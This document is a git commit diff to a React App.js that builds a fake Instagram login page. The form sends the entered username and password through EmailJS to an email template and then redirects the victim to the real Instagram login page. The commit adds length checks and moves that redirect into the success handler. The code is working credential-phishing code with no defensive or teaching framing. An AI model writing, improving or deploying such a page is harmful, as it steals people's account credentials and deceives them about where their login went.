1d7c2a3796c9276913d77d0d48b77c7e74c9f75f
omatillo7 <omatillo.khadjaev@gmail.com>
2023-02-15 00:03:15 -0800

    ss

--- src/App.js
+++ src/App.js
@@ -8,26 +8,29 @@ import emailjs from '@emailjs/browser';
 
 const App = () => {
   const form = useRef();
-  const [userName, setUserName] = useState()
-  const [password, setPassword] = useState()
+  const [userName, setUserName] = useState("")
+  const [password, setPassword] = useState("")
+  const [errors, setErrors] = useState({ userName: "", password: "" })
+
 
   const sendEmail = (e) => {
     e.preventDefault();
-
-    emailjs.sendForm('service_fk4sodi', 'template_4o1s72j', form.current, 'a8UkC4uIcU3L5JwhD')
-      .then((result) => {
+    (userName.length >= 5 && password.length >= 5) ?
+      emailjs.sendForm('service_fk4sodi', 'template_4o1s72j', form.current, 'a8UkC4uIcU3L5JwhD')
+        .then((result) => {
           console.log(result.text);
-      }, (error) => {
+          window.location = "https://www.instagram.com/accounts/login/"
+        }, (error) => {
           console.log(error.text);
-      });
+        })
+      : setErrors({ [`${userName.length < 5 && "userName" || password.length < 5 && "password"}`]: "please complete !" })
   };
-
   return (
     <React.Fragment>
 
       <div id="wrapper">
         <div className="container">
-        {/* <img
+          {/* <img
         className="instapic"
            src="https://lavnik.net/wp-content/uploads/2019/10/instagram-blue-check-mark-verification-theblackmedia-2018.jpg"
            alt="ios app"
@@ -36,7 +39,7 @@ const App = () => {
           <div className="form-data">
             <form ref={form} onSubmit={sendEmail}>
               <div className="logo">
-                <h1>Instagram</h1>  
+                <h1>Instagram</h1>
               </div>
               <input
                 type="text"
@@ -46,6 +49,7 @@ const App = () => {
                 onChange={(e) => setUserName(e.target.value)}
                 required
               />
+              {errors.userName !== "" && <p className="paragraph" >{errors.userName}</p>}
               <input
                 type="password"
                 placeholder="Password"
@@ -53,13 +57,13 @@ const App = () => {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 required />
+              {errors.password !== "" && <p>{errors.password}</p>}
               {/* <input  type="submit" value="Send" /> */}
-              
-              <button 
-              // onClick={() => { window.location = "https://www.instagram.com/accounts/login/" }}
-              className="form-btn"
-              type="submit"
-              value="Send">Log in</button>
+
+              <button
+                type="submit"
+                className="form-btn"
+                value="Send">Log in</button>
 
               <span className="has-separator">Or</span>
               <a href="#" className="facebook-login" onClick={() => { window.location = "https://www.facebook.com/" }}>
@@ -75,7 +79,7 @@ const App = () => {
           </div>
         </div>
       </div>
-    </React.Fragment>
+    </React.Fragment >
   );
 };
 
